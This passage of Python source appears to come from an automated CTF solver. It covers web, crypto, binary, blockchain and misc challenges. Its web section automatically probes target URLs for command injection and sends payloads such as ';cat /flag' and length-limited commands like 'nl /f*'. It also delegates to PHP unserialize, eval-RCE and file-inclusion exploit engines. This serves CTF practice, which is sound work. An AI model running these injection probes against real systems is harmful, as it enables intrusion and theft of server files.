                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = http_get(test_url)
                text = decode_body(body)
                f = find_flag(text)
                if f:
                    self.flag = f
                    self.log("RCE", "flag!", f"param={param}")
                    return
                if expected and expected in text:
                    self.log("RCE", "found", f"param={param} is RCE-vulnerable!")
                    # Try cat flag directly
                    flag_cmds = [";cat /flag", ";cat /flag.txt", ";cat /home/*/flag",
                                  "|cat /flag", "|cat /flag.txt"]
                    for fcmd in flag_cmds[:3]:
                        ftest = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(fcmd)}"
                        code, body, _ = http_get(ftest)
                        ff = find_flag(decode_body(body))
                        if ff:
                            self.flag = ff
                            self.log("RCE", "flag!", f"cmd={fcmd}")
                            return
                    return
        
        self.log("RCE", "none", "No RCE found")
    
    def _try_length_limit_rce(self):
        """长度限制 RCE 检测 (v3.5 新增).
        
        检测模式:
            1. PHP 参数名为数字 (如 $_GET[1]) — 字母参数名被 WAF 拦截
            2. strlen() < N 字符限制 (如 < 8 即 max 7 chars)
            3. shell_exec() / system() 直接执行
        
        利用: 生成 ≤maxlen 的短命令 (nl/f*, tac/f*, od/f* 等)
        """
        self.log("LenRCE", "running", "Probing numeric params + length limit")
        
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        base = f"{parsed.scheme}://{parsed.netloc}{path}"
        
        # ── Step 1: Probe numeric parameter names ──
        # 尝试 0-9 作为参数名，检测是否有 PHP 源码返回
        for pnum in range(10):
            pname = str(pnum)
            test_url = f"{base}?{pname}=1"
            code, body, _ = http_get(test_url, timeout=5)
            if not body:
                continue
            text = decode_body(body)
            
            # 检测是否有 PHP 源码（含高亮）或 shell 输出
            has_php = _detect_php_source(text)
            has_output = (len(text) > 20 and 'too long' not in text.lower()
                         and '<?php' not in text and '&lt;?php' not in text)
            
            if not has_php and not has_output:
                continue
            
            self.log("LenRCE", "param_found", f"param={pname}")
            
            # ── Step 2: Determine max command length ──
            max_len = self._find_max_cmd_len(base, pname)
            if max_len is None or max_len < 2:
                self.log("LenRCE", "no_limit", "No length limit detected or too short")
                # Fall back: try standard short payloads anyway
                max_len = 20
            
            self.log("LenRCE", "limit", f"max cmd length = {max_len}")
            
            # ── Step 3: Execute short payloads ──
            # 按优先级排序的短 payload 库
            short_payloads = [
                # Flag-read commands first (likely to produce flag directly)
                (6, 'nl /f*'),
                (7, 'tac /f*'),
                (6, 'od /f*'),
                (7, 'nl /*f*'),
                (7, 'od /*f*'),
                (7, 'rev /f*'),
                # Recon (to locate flag path)
                (4, 'ls /'),
                (2, 'ls'),
                (2, 'id'),
                # Fallback: other flag paths
                (6, 'nl /h*'),
                (6, 'nl /r*'),
                (6, 'nl /t*'),
                (5, 'nl *'),
                (6, 'tac *'),
                (5, 'rev *'),
                (4, 'od *'),
            ]
            
            tried = set()
            for pay_len, cmd in short_payloads:
                if pay_len > max_len or cmd in tried:
                    continue
                if pay_len > max_len or cmd in tried:
                    continue
                tried.add(cmd)
                
                test_url = f"{base}?{pname}={urllib.parse.quote(cmd)}"
                try:
                    code, body, _ = http_get(test_url, timeout=8)
                    text = decode_body(body)
                    
                    # Extract command output before PHP source (avoid false flag matches in source)
                    clean = re.sub(r'<[^>]+>', '', text)
                    clean = clean.replace('&lt;', '<').replace('&gt;', '>').replace('&nbsp;', ' ').replace('&amp;', '&').replace('<br />', '\n')
                    lines = clean.split('\n')
                    out_lines = []
                    in_source = False
                    for l in lines:
                        if '<?php' in l or 'function ' in l or 'preg_match' in l or 'highlight_file' in l:
                            in_source = True
                            break
                        stripped = l.strip()
                        if stripped and not in_source:
                            out_lines.append(stripped)
                    output_text = '\n'.join(out_lines)
                    
                    # Search flag in output first, then raw (fallback)
                    search = output_text if output_text else text
                    f = find_flag(search)
                    if f:
                        self.flag = f
                        self.log("LenRCE", "flag!", f"param={pname} cmd={cmd}")
                        return
                    
                    # Log command output for debugging
                    if out_lines and not any(kw in out_lines[0].lower() for kw in ['too long', 'waf']):
                        output = ' '.join(out_lines[:3])[:120]
                        self.log("LenRCE", "output", f"cmd={cmd}: {output}")
                except Exception:
                    continue
            
            # Found a working parameter, no need to try more
            break
        else:
            self.log("LenRCE", "none", "No numeric-param RCE found")
    
    def _find_max_cmd_len(self, base: str, param: str) -> int:
        """二分查找确定最大命令长度限制.
        
        注意: 不能用 'too long' 简单匹配，因为 PHP 源码本身包含 exit('too long')。
        正确逻辑: 有 PHP 源码返回 = 命令通过；纯 'too long' 文本 = 长度超限。
        """
        def _cmd_passes(length: int) -> bool:
            """发送指定长度的命令，返回 True 表示通过长度检查"""
            url_m = base + '?' + param + '=' + ('A' * length)
            code, body, _ = http_get(url_m, timeout=5)
            text = decode_body(body)
            # 有 PHP 源码 = 命令通过（即使源码含 'too long' 字样）
            return _detect_php_source(text)
        
        # 快速探测
        if _cmd_passes(20):
            return 20  # 无长度限制
        if _cmd_passes(7):
            # 7 通过，20 不通过 → 二分搜索 7..20
            lo, hi = 7, 20
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _cmd_passes(mid):
                    lo = mid
                else:
                    hi = mid - 1
            return lo
        else:
            # 7 也不通过 → 二分搜索 1..7
            lo, hi = 1, 7
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _cmd_passes(mid):
                    lo = mid
                else:
                    hi = mid - 1
            return lo
    
    def _try_bashfuck_rce(self):
        """bashFuck 无字母命令执行 — 委托给 bashfuck_solver 通用引擎.
        
        bashfuck_solver.py 覆盖:
            - PHP system/exec/passthru + WAF 过滤
            - GET/POST 自动探测 + 三级编码策略(bit/zero/c)
            - 函数链追踪 (function f($p){system($p)} → $_POST)
        """
        self.log("bashFuck", "running", "bashfuck_solver v1.0")
        from yang_web.core.bashfuck_solver import auto_solve as bf_auto_solve

        def _progress(stage, item, status):
            self.log(stage, item, status)

        result = bf_auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("bashFuck", "flag!",
                         f"form={result.get('form')}, param={result.get('param')}: {self.flag}")
            else:
                self.log("bashFuck", "none", result.get('status', 'No flag found'))

    def _try_php_unserialize(self):
        """PHP 反序列化漏洞自动检测与利用 — 委托给 php_unserialize 通用引擎.

        php_unserialize.py 统一处理所有变体:
            - 基础属性验证 | __wakeup 绕过 (CVE-2016-7124)
            - == 弱类型绕过 (bool/int) | private/protected 编码
            - 简单 POP 链 (__destruct → 危险函数)
        """
        self.log("PHP-Unserialize", "running", "php_unserialize 通用求解器 v1.0")
        from yang_web.core.php_unserialize import auto_solve

        def _progress(stage, item, status):
            self.log(stage, item, status)

        result = auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("PHP-Unserialize", "flag!",
                         f"class={result.get('class')}, strategy={result.get('strategy')}: {self.flag}")
            else:
                self.log("PHP-Unserialize", "none", "All classes & strategies tried, no flag")

    def _try_php_eval_rce(self):
        """PHP MD5 碰撞 + eval() RCE — 委托给 php_eval_rce 通用引擎。

        php_eval_rce.py 覆盖的题型：
            - md5($r1)===md5($r2) && $r1!==$r2 碰撞检查
            - eval($r3) + WAF 关键字黑名单（只挡完整 keyword）
            - 字符串拼接绕过关键字（'fl'.'ag' → /flag）
            - GET/POST/COOKIE 多入口自动探测
        """
        self.log("PHP-EvalRCE", "running", "php_eval_rce 通用求解器 v1.0")
        from yang_web.core.php_eval_rce import auto_solve as eval_auto_solve

        def _progress(msg):
            self.log("PHP-EvalRCE", msg, "")

        result = eval_auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("PHP-EvalRCE", "flag!",
                         f"strategy={result.get('strategy')}: {self.flag}")
            else:
                self.log("PHP-EvalRCE", "none", result.get('status', 'No flag'))

    def _try_php_file_inclusion(self):
        """PHP 文件包含漏洞自动检测与利用 — 委托给 php_lfi 通用引擎.

        php_lfi.py 覆盖的题型:
            - HelloCTF PHPinclude-labs 全系列 (file://, php://filter 等)
            - include/require(_once) + 用户可控参数
            - 协议约束识别 (allow_url_fopen/allow_url_include)
            - 路径遍历 + 常见 flag 位置自动探测
            - php://filter base64 编码绕过 PHP 执行
        """
        self.log("PHP-LFI", "running", "php_lfi 通用求解器 v1.0")
        from yang_web.core.php_lfi import auto_solve as lfi_auto_solve

        def _progress(stage, item, status):
            self.log(stage, item, status)

        result = lfi_auto_solve(self.url, on_progress=_progress)
        if result:
            self.flag = result.get('flag')
            if self.flag:
                self.log("PHP-LFI", "flag!",
                         f"param={result.get('param')}, path={result.get('path')}, strategy={result.get('strategy')}: {self.flag}")
            else:
                self.log("PHP-LFI", "none", result.get('status', 'No flag found'))

    def _final_result(self, success: bool) -> dict:
        return {
            "success": success,
            "flag": self.flag,
            "results": self.results,
            "category": "web",
            "url": self.url,
        }


# ═══════════════════════════════════════════════════════════
#  密码自动求解引擎
# ═══════════════════════════════════════════════════════════

class CryptoSmartSolver:
    """密码学自动求解 — 链式解码 + 古典密码检测."""
    
    # Base 家族编码特征
    BASE_FEATURES = {
        "base64": r'^[A-Za-z0-9+/]+=*$',
        "base32": r'^[A-Z2-7]+=*$',
        "base16": r'^[0-9A-Fa-f]+$',
        "base58": r'^[1-9A-HJ-NP-Za-km-z]+$',
        "base85": r'^[A-Za-z0-9!#$%&()*+,\-./:;<=>?@[\]^_`{|}~]+$',
    }
    
    def __init__(self, ciphertext: str):
        self.ciphertext = ciphertext
        self.results: List[dict] = []
        self.flag: Optional[str] = None
    
    def log(self, step: str, status: str, detail: str = ""):
        self.results.append({"step": step, "status": status, "detail": detail})
    
    def solve(self) -> dict:
        """自动求解密码."""
        ct = self.ciphertext.strip()
        
        # Check if it's already a flag
        f = find_flag(ct)
        if f:
            self.flag = f
            self.log("Input", "flag!", "Already contains flag")
            return self._result(True)
        
        # 1. Base family chain decoding
        self._try_base_chain(ct)
        if self.flag:
            return self._result(True)
        
        # 2. Hex decoding
        self._try_hex(ct)
        if self.flag:
            return self._result(True)
        
        # 3. ROT family
        self._try_rot(ct)
        if self.flag:
            return self._result(True)
        
        # 4. XOR brute force
        self._try_xor_brute(ct)
        if self.flag:
            return self._result(True)
        
        # 5. Hash identification
        self._identify_hash(ct)
        
        return self._result(False)
    
    def _try_base_chain(self, ct: str, depth: int = 0, max_depth: int = 10):
        """链式 Base 解码."""
        if depth >= max_depth or len(ct) < 4:
            return
        
        import base64
        
        decoders = [
            ("base64", lambda s: base64.b64decode(s, validate=False)),
            ("base32", lambda s: base64.b32decode(s, casefold=True)),
            ("base16", lambda s: base64.b16decode(s, casefold=True)),
        ]
        
        for name, decoder in decoders:
            try:
                decoded = decoder(ct).decode('utf-8', errors='replace')
                if len(decoded) < len(ct) * 0.8 and len(decoded) > 0:  # 合理缩小
                    self.log(f"Decode", "step", f"{name}: {decoded[:80]}")
                    f = find_flag(decoded)
                    if f:
                        self.flag = f
                        self.log("Decode", "flag!", f"{name} chain: {f}")
                        return
                    # 继续链式解码
                    if any(c.isalpha() for c in decoded):
                        self._try_base_chain(decoded, depth + 1, max_depth)
            except Exception:
                continue
    
    def _try_hex(self, ct: str):
        """Hex 解码."""
        try:
            if all(c in '0123456789abcdefABCDEF' for c in ct) and len(ct) % 2 == 0:
                decoded = bytes.fromhex(ct).decode('utf-8', errors='replace')
                self.log("Hex", "decode", decoded[:80])
                f = find_flag(decoded)
                if f:
                    self.flag = f
                    self.log("Hex", "flag!", f)
                    return
                # Continue base chain on hex-decoded result
                self._try_base_chain(decoded)
        except Exception:
            pass
    
    def _try_rot(self, ct: str):
        """ROT 系列爆破."""
        for shift in range(1, 26):
            result = ""
            for c in ct:
                if 'a' <= c <= 'z':
                    result += chr((ord(c) - ord('a') + shift) % 26 + ord('a'))
                elif 'A' <= c <= 'Z':
                    result += chr((ord(c) - ord('A') + shift) % 26 + ord('A'))
                else:
                    result += c
            f = find_flag(result)
            if f:
                self.flag = f
                self.log("ROT", "flag!", f"ROT{shift}: {f}")
                return
        self.log("ROT", "none", "No flag found in ROT 1-25")
    
    def _try_xor_brute(self, ct: str):
        """XOR 字节爆破（0-255）."""
        try:
            raw = ct.encode('latin-1')
        except Exception:
            return
        
        for key in range(256):
            result = bytes(b ^ key for b in raw)
            try:
                text = result.decode('utf-8', errors='replace')
                f = find_flag(text)
                if f:
                    self.flag = f
                    self.log("XOR", "flag!", f"key=0x{key:02x}: {f}")
                    return
            except Exception:
                pass
        self.log("XOR", "none", "No flag in single-byte XOR")
    
    def _identify_hash(self, ct: str):
        """Hash 类型识别."""
        patterns = {
            "MD5": r'^[a-f0-9]{32}$',
            "SHA1": r'^[a-f0-9]{40}$',
            "SHA256": r'^[a-f0-9]{64}$',
            "SHA512": r'^[a-f0-9]{128}$',
            "NTLM": r'^[A-F0-9]{32}$',
            "MySQL5": r'^\*[A-F0-9]{40}$',
            "bcrypt": r'^\$2[aby]\$\d+\$[./A-Za-z0-9]{53}$',
        }
        for hash_type, pattern in patterns.items():
            if re.match(pattern, ct):
                self.log("Hash", "found", f"Detected {hash_type}")
                return
    
    def _result(self, success: bool) -> dict:
        return {
            "success": success,
            "flag": self.flag,
            "results": self.results,
            "category": "crypto",
            "input": self.ciphertext[:100],
        }


# ═══════════════════════════════════════════════════════════
#  二进制分析引擎 (PWN / Reverse)
# ═══════════════════════════════════════════════════════════

class BinaryAnalyzer:
    """二进制文件分析器 — PE/ELF 检测、保护机制、字符串提取."""
    
    # Magic bytes
    MAGIC = {
        b'\x7fELF': 'ELF (Linux executable)',
        b'MZ': 'PE (Windows executable)',
        b'\xca\xfe\xba\xbe': 'Mach-O (macOS)',
        b'\xce\xfa\xed\xfe': 'Mach-O (32-bit)',
        b'PK\x03\x04': 'ZIP/JAR/APK',
        b'\x89PNG': 'PNG image',
        b'\xff\xd8\xff': 'JPEG image',
        b'GIF8': 'GIF image',
        b'%PDF': 'PDF document',
    }
    
    # ELF protection flags
    ELF_PROTECTIONS = {
        "RELRO": ["Full RELRO", "Partial RELRO", "No RELRO"],
        "STACK CANARY": ["Canary found", "No canary"],
        "NX": ["NX enabled", "NX disabled"],
        "PIE": ["PIE enabled", "PIE disabled"],
        "RPATH": ["RPATH found", "No RPATH"],
        "RUNPATH": ["RUNPATH found", "No RUNPATH"],
        "FORTIFY": ["Fortify enabled", "Fortify disabled"],
    }
    
    def __init__(self, filepath: str):
        self.filepath = filepath
        self.data: bytes = b""
        self.results: List[dict] = []
        self.file_type: str = "unknown"
    
    def log(self, step: str, status: str, detail: str = ""):
        self.results.append({"step": step, "status": status, "detail": detail})
    
    def load(self) -> bool:
        """加载文件."""
        try:
            with open(self.filepath, 'rb') as f:
                self.data = f.read()
            self.log("Load", "ok", f"{len(self.data)} bytes from {self.filepath}")
            return True
        except Exception as e:
            self.log("Load", "fail", str(e)[:100])
            return False
    
    def analyze(self) -> dict:
        """完整分析流程."""
        if not self.load():
            return self._result(False)
        
        # 1. 文件类型检测
        self._detect_type()
        
        # 2. 字符串提取 + flag 搜索
        self._extract_strings()
        
        # 3. 熵分析
        self._entropy_analysis()
        
        # 4. PE 分析
        if self.file_type == "PE":
            self._analyze_pe()
        
        # 5. ELF 分析
        if self.file_type == "ELF":
            self._analyze_elf()
        
        # 6. APK 提示
        if self.file_type == "ZIP/APK":
            self._apk_hints()
        
        return self._result(True)
    
    def _detect_type(self):
        """Magic bytes 检测."""
        for magic, ftype in self.MAGIC.items():
            if self.data.startswith(magic):
                self.file_type = ftype.split(" ")[0]
                self.log("File Type", "found", ftype)
                return
        
        # Text-based fallback
        try:
            text = self.data.decode('utf-8')[:200]
            if text.isprintable() and len(text) > 10:
                self.file_type = "text"
                self.log("File Type", "found", "Plain text")
        except Exception:
            self.file_type = "unknown"
            self.log("File Type", "unknown", f"Magic: {self.data[:16].hex()}")
    
    def _extract_strings(self):
        """提取可读字符串并搜索 flag."""
        strings_found = []
        current = b""
        
        for b in self.data:
            if 0x20 <= b <= 0x7e:
                current += bytes([b])
            else:
                if len(current) >= 4:
                    s = current.decode('ascii', errors='replace')
                    strings_found.append(s)
                current = b""
        
        if len(current) >= 4:
            strings_found.append(current.decode('ascii', errors='replace'))
        
        # Search for flags in strings
        flags = []
        for s in strings_found:
            f = find_flag(s)
            if f:
                flags.append(f)
                self.flag = f
        
        # Interesting strings (URLs, paths, passwords, keys)
        interesting = []
        for s in strings_found:
            if any(kw in s.lower() for kw in 
                   ['password', 'secret', 'key', 'flag', 'token', 'admin',
                    '/bin/sh', '/bin/bash', 'system', 'exec', 'http://', 'https://',
                    '@', '.php', '.py', '.so', '.dll']):
                interesting.append(s)
        
        self.log("Strings", "ok", f"{len(strings_found)} strings, {len(interesting)} interesting")
        for intr in interesting[:20]:
            self.log("  String", "info", intr[:100])
        
        if flags:
            self.log("Flag in strings", "flag!", flags[0])
    
    def _entropy_analysis(self):
        """熵分析 — 检测加密/压缩."""
        if len(self.data) < 256:
            return
        
        # Simple Shannon entropy
        from collections import Counter
        counts = Counter(self.data)
        total = len(self.data)
        entropy = 0.0
        for count in counts.values():
            p = count / total
            if p > 0:
                import math
                entropy -= p * math.log2(p)
        
        entropy_norm = entropy / 8.0  # Normalized
        
        if entropy_norm > 0.9:
            self.log("Entropy", "high", "Likely encrypted or compressed")
        elif entropy_norm > 0.7:
            self.log("Entropy", "medium", "Partially encrypted/compressed")
        else:
            self.log("Entropy", "normal", "Likely plain binary/code")
    
    def _analyze_pe(self):
        """PE 文件简易分析."""
        self.log("PE Analysis", "info", "Windows executable detected")
        # Check if x86 or x64
        if self.data[0x3c:0x3c+2]:
            pe_offset = int.from_bytes(self.data[0x3c:0x3c+2], 'little')
            if len(self.data) > pe_offset + 4:
                if self.data[pe_offset:pe_offset+4] == b'PE\x00\x00':
                    machine = int.from_bytes(self.data[pe_offset+4:pe_offset+6], 'little')
                    arch = "x86" if machine == 0x14c else "x64" if machine == 0x8664 else f"arch={machine}"
                    self.log("PE Arch", "info", arch)
                    # Check for .NET
                    # Look for sections
                    for s in ['.NET', 'mscoree', 'CorExeMain']:
                        if s.encode() in self.data:
                            self.log("PE .NET", "info", ".NET assembly detected")
                            break
    
    def _analyze_elf(self):
        """ELF 文件简易分析."""
        self.log("ELF Analysis", "info", "Linux executable detected")
        
        if len(self.data) < 20:
            return
        
        # Bits (32/64)
        bits = self.data[4]
        arch_map = {1: "x86-32", 2: "x86-64"}
        self.log("ELF Arch", "info", arch_map.get(bits, f"bits={bits}"))
        
        # Endian
        endian = "Little-endian" if self.data[5] == 1 else "Big-endian"
        self.log("ELF Endian", "info", endian)
        
        # Check for basic protections via section analysis
        # NX bit
        has_nx = b'GNU_STACK' in self.data and b'RWE' not in self.data[:self.data.index(b'GNU_STACK')+20] if b'GNU_STACK' in self.data else False
        self.log("ELF NX", "info", "NX likely enabled" if has_nx else "NX status unknown")
        
        # Check for common vulnerability patterns in strings
        vuln_hints = []
        if b'gets(' in self.data or b'system(' in self.data:
            vuln_hints.append("gets()/system() calls")
        if b'strcpy' in self.data or b'sprintf' in self.data or b'strcat' in self.data:
            vuln_hints.append("Unsafe string functions")
        if b'/bin/sh' in self.data:
            vuln_hints.append("Contains /bin/sh")
        
        if vuln_hints:
            self.log("ELF Vuln Hints", "info", ", ".join(vuln_hints))
    
    def _apk_hints(self):
        """APK/ZIP 分析提示."""
        self.log("APK Hints", "info", "Android APK or ZIP detected")
        self.log("APK Action", "info", 
                 "Use: jadx-gui or APK逆向Solver.py for analysis")
    
    def _result(self, success: bool) -> dict:
        return {
            "success": success,
            "flag": getattr(self, 'flag', None),
            "results": self.results,
            "category": "binary",
            "file_type": self.file_type,
            "filepath": self.filepath,
        }


# ═══════════════════════════════════════════════════════════
#  Blockchain 分析引擎
# ═══════════════════════════════════════════════════════════

class BlockchainAnalyzer:
    """区块链/智能合约题目分析器."""
    
    SOLIDITY_PATTERNS = [
        (r'msg\.sender', "msg.sender usage - possible auth bypass"),
        (r'require\s*\(', "require() check"),
        (r'assert\s*\(', "assert() check"),
        (r'call\s*\{.*value', "Low-level call with value"),
        (r'delegatecall', "DELEGATECALL - potential proxy attack"),
        (r'selfdestruct', "selfdestruct - destruction capability"),
        (r'tx\.origin', "tx.origin - phishing vulnerability"),
        (r'block\.timestamp', "block.timestamp dependency"),
        (r'block\.number', "block.number dependency"),
        (r'\.transfer\(', ".transfer() usage"),
        (r'\.send\(', ".send() usage"),
        (r'payable', "payable function"),
        (r'onlyOwner', "onlyOwner modifier - access control"),
        (r'constructor\s*\(', "Constructor"),
        (r'fallback\s*\(', "Fallback function"),
        (r'receive\s*\(', "Receive function"),
        (r'ERC20', "ERC20 token"),
        (r'ERC721', "ERC721 NFT"),
        (r'mapping\s*\(', "Storage mapping"),
    ]
    
    def __init__(self, source: str = "", bytecode: str = ""):
        self.source = source
        self.bytecode = bytecode
        self.results: List[dict] = []
        self.findings: List[str] = []
    
    def log(self, step: str, status: str, detail: str = ""):
        self.results.append({"step": step, "status": status, "detail": detail})
    
    def analyze(self) -> dict:
        """分析合约源码或字节码."""
        if self.source:
            self._analyze_solidity()
        
        if self.bytecode:
            self._analyze_bytecode()
        
        if not self.source and not self.bytecode:
            # Provide hints for common blockchain CTF scenarios
            self._general_hints()
        
        return self._result()
    
    def _analyze_solidity(self):
        """分析 Solidity 源码."""
        self.log("Solidity", "running", f"{len(self.source)} chars")
        
        for pattern, description in self.SOLIDITY_PATTERNS:
            matches = re.findall(pattern, self.source, re.IGNORECASE)
            if matches:
                self.findings.append(description)
                self.log("Pattern", "found", description)
        
        # Flag search
        f = find_flag(self.source)
        if f:
            self.log("Flag in source", "flag!", f)
    
    def _analyze_bytecode(self):
        """分析 EVM 字节码（简易版）."""
        self.log("Bytecode", "info", f"{len(self.bytecode)} chars")
        
        # Common opcode patterns
        if '54' in self.bytecode:  # SLOAD
            self.findings.append("Storage read (SLOAD) detected")
            self.log("Opcode", "info", "SLOAD - reads from storage")
        if 'f3' in self.bytecode:  # RETURN
            self.log("Opcode", "info", "RETURN - contract returns data")
    
    def _general_hints(self):
        """区块链 CTF 通用提示."""
        hints = [
            "Check for reentrancy (CALL before state update)",
            "Check for integer overflow/underflow",
            "Check for flash loan manipulation",
            "Check access control (tx.origin vs msg.sender)",
            "Check price oracle manipulation",
            "Use Foundry/Hardhat for local testing",
            "Use cast call for read-only interactions",
        ]
        for hint in hints:
            self.log("Hint", "info", hint)
    
    def _result(self) -> dict:
        return {
            "success": len(self.findings) > 0,
            "results": self.results,
            "findings": self.findings,
            "category": "blockchain",
        }


# ═══════════════════════════════════════════════════════════
#  Misc / 取证 / 隐写 分析引擎
# ═══════════════════════════════════════════════════════════

class MiscAnalyzer:
    """杂项/取证/隐写题目分析器（文件路由）."""
    
    FILE_TYPE_HINTS = {
        "PK": ("ZIP/Archive", ["zip_tools.py", "Try binwalk/foremost for embedded files"]),
        "\x89PNG": ("PNG Image", ["img_stego.py", "Check LSB, palette, chunk structure"]),
        "\xff\xd8": ("JPEG Image", ["img_stego.py", "Check EXIF, appended data"]),
        "GIF8": ("GIF Image", ["img_stego.py", "Check frame delays, palette"]),
        "%PDF": ("PDF Document", ["Check embedded objects, JavaScript"]),
        "RIFF": ("WAV/AVI", ["Check audio stego (spectrogram, LSB)"]),
        "BM": ("BMP Image", ["img_stego.py", "LSB stego"]),
        "\xd4\xc3\xb2\xa1": ("PCAP", ["pcap_tools.py", "Wireshark analysis"]),
    }
    
    def __init__(self, filepath: str):
        self.filepath = filepath
        self.results: List[dict] = []
    
    def log(self, step: str, status: str, detail: str = ""):
        self.results.append({"step": step, "status": status, "detail": detail})
    
    def analyze(self) -> dict:
        """分析文件类型并提供解题提示."""
        try:
            with open(self.filepath, 'rb') as f:
                header = f.read(16)
        except Exception as e:
            self.log("Load", "fail", str(e)[:100])
            return self._result(False)
        
        # Detect type
        detected = False
        for magic, (ftype, hints) in self.FILE_TYPE_HINTS.items():
            magic_bytes = magic.encode() if isinstance(magic, str) else magic
            if header.startswith(magic_bytes):
                detected = True
                self.log("File Type", "found", ftype)
                for hint in hints:
                    self.log("Hint", "info", hint)
                break
        
        if not detected:
            # General hints
            self.log("File Type", "unknown", f"Header: {header[:8].hex()}")
            self.log("Hint", "info", "Try file_analyzer.py for hex dump")
            self.log("Hint", "info", "Check for embedded files with binwalk")
        
        return self._result(detected)
    
    def _result(self, success: bool) -> dict:
        return {
            "success": success,
            "results": self.results,
            "category": "misc",
            "filepath": self.filepath,
        }


# ═══════════════════════════════════════════════════════════
#  智能求解编排器
# ═══════════════════════════════════════════════════════════

class SmartSolver:
    """顶层智能求解编排器 — 自动分类 + 路由求解.
    
    Usage:
        solver = SmartSolver()
        result = solver.solve(metadata={
            "name": "SCTF 2026 phpStilAlive",
            "tags": [{"name": "Web"}, {"name": "PHP"}],
            "problemType": 1,
            "desc": "SCTF 2026 Web / PHP dynamic",
        }, url="http://container-url:port/")
    """
    
    def __init__(self):
        self.results_history: List[dict] = []
        self.categories_stats: Dict[str, int] = {}
    
    def solve(self, metadata: dict, url: str = "", filepath: str = "",
              ciphertext: str = "", source: str = "", bytecode: str = "") -> dict:
        """智能求解入口.
        
        Args:
            metadata: 题目元数据 (name, tags, desc, etc.)
            url: Web 题目 URL
            filepath: 附件文件路径
            ciphertext: 密码题目密文
            source: 区块链题目源码
            bytecode: 区块链题目字节码
        
        Returns:
            {"success": bool, "flag": str|None, "category": str, "results": [...], ...}
        """
        # Step 1: 分类
        category = classify_problem(metadata)
        self.log(category, f"Classified as: {category}")
        self.categories_stats[category] = self.categories_stats.get(category, 0) + 1
        
        result = {"success": False, "flag": None, "category": category, "results": []}
        
        # Step 2: 路由求解
        if category == "web" and url:
            result = self._solve_web(url)
        elif category == "web" and not url:
            result = {"success": False, "flag": None, "category": "web",
                      "error": "No URL provided for Web problem",
                      "results": [{"step": "Pre", "status": "fail",
                                   "detail": "Need container URL to attack"}]}
        elif category == "crypto" and ciphertext:
            result = self._solve_crypto(ciphertext)
        elif category == "crypto" and not ciphertext:
            result = {"success": False, "flag": None, "category": "crypto",
                      "error": "Need ciphertext", "results": []}
        elif category in ("pwn", "reverse") and filepath:
            result = self._solve_binary(filepath)
        elif category in ("pwn", "reverse") and not filepath:
            result = {"success": False, "flag": None, "category": category,
                      "error": "Need binary file (ELF/PE)",
                      "results": []}
        elif category == "blockchain":
            result = self._solve_blockchain(source, bytecode)
        elif category == "misc":
            result = self._solve_misc(filepath) if filepath else {
                "success": False, "flag": None, "category": "misc",
                "error": "Need file for analysis",
                "results": [{"step": "Pre", "status": "info",
                             "detail": "Misc problems need file analysis"}]}
        else:
            result = {
                "success": False, "flag": None, "category": "unknown",
                "results": [{"step": "Classification", "status": "fail",
                             "detail": f"Cannot classify: {metadata.get('name', '?')}"}]}
        
        self.results_history.append(result)
        return result
    
    def log(self, category: str, detail: str):
        """记录分类日志."""
        pass  # Internal logging
    
    def _solve_web(self, url: str) -> dict:
        solver = WebSmartSolver(url)
        return solver.solve()
    
    def _solve_crypto(self, ciphertext: str) -> dict:
        solver = CryptoSmartSolver(ciphertext)
        return solver.solve()
    
    def _solve_binary(self, filepath: str) -> dict:
        analyzer = BinaryAnalyzer(filepath)
        return analyzer.analyze()
    
    def _solve_blockchain(self, source: str = "", bytecode: str = "") -> dict:
        analyzer = BlockchainAnalyzer(source, bytecode)
        return analyzer.analyze()
    
    def _solve_misc(self, filepath: str) -> dict:
        analyzer = MiscAnalyzer(filepath)
        return analyzer.analyze()
    
    def batch_solve(self, problems: List[dict], 
                    containers: Dict[str, str] = None,
                    attachments: Dict[str, str] = None) -> List[dict]:
        """批量求解多道题.
        
        Args:
            problems: 题目列表
            containers: {problem_id: url} 容器URL映射
            attachments: {problem_id: filepath} 附件文件映射
        
        Returns:
            [{...}, ...] 每道题的求解结果
        """
        if containers is None:
            containers = {}
        if attachments is None:
            attachments = {}
        
        all_results = []
        for p in problems:
            pid = p.get("id", "")
            name = p.get("name", "Unknown")
            url = containers.get(pid, "")
            filepath = attachments.get(pid, "")
            
            print(f"\n{'='*60}")
            print(f"Solving: {name} (ID: {pid})")
            print(f"URL: {url or 'N/A'}, File: {filepath or 'N/A'}")
            
            result = self.solve(metadata=p, url=url, filepath=filepath)
            status = "✅ SOLVED" if result.get("success") else "❌ UNSOLVED"
            flag = result.get("flag", "")
            
            print(f"Result: {status}")
            if flag:
                print(f"Flag: {flag}")
            else:
                print(f"Results: {len(result.get('results', []))} steps attempted")
            
            all_results.append({"problem": name, "id": pid, **result})
        
        return all_results
    
    def print_summary(self, results: List[dict]):
        """打印批量求解摘要."""
        solved = [r for r in results if r.get("success")]
        unsolved = [r for r in results if not r.get("success")]
        
        print(f"\n{'='*60}")
        print(f"BATCH SOLVE SUMMARY")
        print(f"{'='*60}")
        print(f"Total: {len(results)} | Solved: {len(solved)} | Unsolved: {len(unsolved)}")
        
        if solved:
            print(f"\n✅ Solved ({len(solved)}):")
            for r in solved:
                print(f"   {r['problem']}: {r.get('flag', 'N/A')}")
        
        if unsolved:
            print(f"\n❌ Unsolved ({len(unsolved)}):")
            for r in unsolved:
                err = r.get("error", "No specific error")
                cat = r.get("category", "?")
                print(f"   [{cat}] {r['problem']}: {err}")


# ═══════════════════════════════════════════════════════════
#  CLI 入口
# ═══════════════════════════════════════════════════════════

def main():
    """CLI 测试入口."""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python smart_solver.py web <url>")
        print("  python smart_solver.py crypto <ciphertext>")
        print("  python smart_solver.py binary <filepath>")
        print("  python smart_solver.py blockchain <source_file>")
        print("  python smart_solver.py misc <filepath>")
        print("  python smart_solver.py batch <problems_json>")
        return
    
    cmd = sys.argv[1]
    solver = SmartSolver()
    
